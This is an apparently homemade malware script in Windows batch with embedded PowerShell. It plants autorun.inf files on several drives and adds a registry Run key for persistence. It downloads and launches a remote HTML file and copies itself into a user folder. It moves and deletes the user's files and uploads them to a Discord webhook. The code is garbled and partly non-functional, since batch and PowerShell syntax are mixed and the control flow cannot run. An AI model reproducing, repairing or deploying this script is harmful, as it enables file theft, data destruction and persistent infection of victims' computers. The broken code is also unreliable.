@echo off
set mmc="[autorun]
open=@0
label=%random%%random%%random%%random%"
set KEY_NAME="HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
set VALUE_NAME="%random%%random%%random%%random%"
set VALUE_DATA="@0"
goto hk
CD C:\
goto DR
CD D:\
echo %mmc% > autorun.inf
goto DR
CD E:\
echo %mmc% > autorun.inf
goto DR
CD F:\
echo %mmc% > autorun.inf
goto DR
DR: for d in dir {
	$url = "https://github.com/kaosSec/kaosTools/raw/main/js/htmldp75"
	$output = "%desktop%\%random%%random%%random%%random%\%random%%random%%random%%random%\thisishowmanypeoplewanthexwithhorses%random%%random%peoplewantthatyeaa.html"
	Invoke-WebRequest -Uri $url -OutFile $output
	Start-Process -FilePath $output
	set lee="%User%\LioTech\bin\%random%%random%"
	copy @0 %lee%
	set VALUE_NAME="%random%%random%%random%%random%"
	set VALUE_DATA="%lee%"
	goto hk
	set bgbg="%random%%random%"
	echo %bgbg% > %User%\sc
	if %d% == dir: CD %d% goto DIR
	if %d% == file: COPY %d% %Temp%\%bgbg%\data DEL %d%
}
set PSPS="$fileList = Get-Content "%Temp%\%bgbg%\data"
foreach ($file in $fileList) {
    $url = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"
    $webhookParams = @{
        "file" = (Get-Item $file)
    }
    Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data" -Body $webhookParams
}"
pow:
powershell.exe -ExecutionPolicy Bypass -Script "%PSPS%"
hk:
reg add %KEY_NAME% /v %VALUE_NAME% /t REG_SZ /d %VALUE_DATA% /f
